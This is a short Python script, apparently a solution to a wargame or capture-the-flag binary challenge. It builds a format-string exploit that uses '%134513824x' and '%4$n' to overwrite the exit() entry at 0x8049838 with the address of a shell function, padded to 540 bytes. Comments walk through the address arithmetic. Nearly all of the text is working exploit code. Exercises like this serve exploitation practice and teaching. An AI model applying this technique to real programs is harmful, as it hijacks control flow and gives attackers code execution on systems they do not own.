exit_plt = 0x8049838
shell_func = 0x080484a4


def pad(s):
        return s+ "X" * (540 -len(s))
exploit =""
exploit += struct.pack("I", exit_plt)
# 080484a4 in decimal 134513828
# So we just remove our adress size that is 4
# 134513824 and we find this number that we can put in the value
# of the jmp adress
exploit += "%134513824x"
exploit += "%4$n"
print(pad(exploit))
